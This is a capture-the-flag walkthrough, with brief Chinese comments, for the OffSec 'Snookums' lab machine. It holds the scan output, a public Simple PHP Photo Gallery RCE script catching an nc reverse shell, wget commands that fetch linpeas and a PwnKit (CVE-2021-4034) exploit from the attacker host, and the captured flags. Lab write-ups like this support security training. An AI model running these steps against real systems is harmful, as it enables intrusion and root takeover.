###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Snookums
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.214.58 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.214.58:22
Open 192.168.214.58:21
Open 192.168.214.58:139
Open 192.168.214.58:111
Open 192.168.214.58:80
Open 192.168.214.58:445
Open 192.168.214.58:33060

PORT      STATE SERVICE     REASON  VERSION
21/tcp    open  ftp         syn-ack vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.211
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
33060/tcp open  mysqlx?     syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

搜尋[SimplePHPGal-RCE.py](https://github.com/beauknowstech/SimplePHPGal-RCE.py)，照著上面用
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445 
listening on [any] 445 ...

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 SimplePHPGal-RCE.py http://192.168.214.58/ 192.168.45.211 445 
[✔] Serving HTTP traffic from /home/kali/pgplay on 192.168.45.211 using port 80 in background
Run 'nc -nlvp 445' on attacker machine in another terminal. Then press any key to continue
Attempting to reach reverse shell on 192.168.45.211 on port 80
192.168.214.58 - - [09/Apr/2024 22:14:52] "GET /rev.php HTTP/1.0" 200 -
Request sent. Check your nc for a connection

connect to [192.168.45.211] from (UNKNOWN) [192.168.214.58] 40998
SOCKET: Shell has connected! PID: 1839
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ 
```

用`linpeas.sh`
```
bash-4.2$ wget 192.168.45.211:139/linpeas.sh
bash-4.2$ chmod +x linpeas.sh
bash-4.2$ ./linpeas.sh

...
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
...
```

用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)，在/root得proof.txt，在`/home/micheal`得local.txt
```
bash-4.2$ wget 192.168.45.211:139/CVE-2021-4034.py
bash-4.2$ python CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()

[root@snookums root]# cat proof.txt
c5d7114017cc3fc5f709f38148300900

[root@snookums michael]# cat local.txt
ad1e0dad224b2bde9cef512902c67d8d
```